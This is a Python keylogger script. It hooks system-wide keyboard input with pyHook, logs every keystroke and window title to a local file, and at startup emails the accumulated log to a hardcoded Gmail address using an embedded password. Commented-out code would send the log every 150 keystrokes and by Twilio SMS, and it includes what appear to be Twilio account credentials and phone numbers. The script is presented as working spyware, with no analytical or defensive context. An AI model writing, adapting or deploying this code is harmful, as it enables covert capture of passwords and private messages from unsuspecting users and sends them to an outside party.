import pyHook, pythoncom, sys, logging
import smtplib
import os
from datetime import datetime

#from twilio.rest import Client

#client = Client('AC0eea361346bd1925106952b7294e86e9','7d79351a99d269e3c28ef86fafb6c32d')

file_log = 'log.txt'

file = open(file_log, 'a')
file.close()
file = open(file_log, 'r')
message = file.read().encode('utf-8')
file.close()

sender = 'archnomed@gmail.com'
receiver = 'archnomed@gmail.com'

password = 'persistent'

try:
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(sender,password)
    server.sendmail(sender,receiver,message)
    server.quit()
except:
    pass


todays_date = datetime.now().strftime('%Y-%b-%d')

file = open(file_log, 'a')
file.write('\n')
file.write('*****NEW SESSION --> ' + str(todays_date) + '*****')
file.write('\n')
file.close()

char_count = 0
window = ""

def OnKeyboardEvent(event):
    #logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    #logging.log(10,chr(event.KeyID))
    global char_count
    global window
    
    char_count = char_count+1

    file = open(file_log, 'a')

    if(window!=event.WindowName):
        file.write('\n\n# New Window --> ' + event.WindowName + '\n\n')
        window = event.WindowName

    if(event.KeyID == 13 or event.KeyID == 9):
        file.write('\n')
        
    elif(event.KeyID == 160):
        file.write('(SHIFT)')
        
    elif(event.KeyID == 190):
        file.write('(DOT)')
        #smtpObj = smtplib.SMTP('localhost')
        #smtpObj.sendmail(sender, receivers, message)         
        #client.messages.create(from_="+917760907411",to="+919880499397",body=file)
        
    elif(event.KeyID == 8):
        file.write('(BS)')
        
    else:
        file.write(chr(event.KeyID)) 
        file.close()

    #if (char_count == 150):
        #server = smtplib.SMTP('smtp.gmail.com:587')
        #server.starttls()
        #server.login(sender,password)
        #server.sendmail(sender,receiver,message)
        #server.quit()
        #char_count = 0
        
    #print(event.KeyID)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
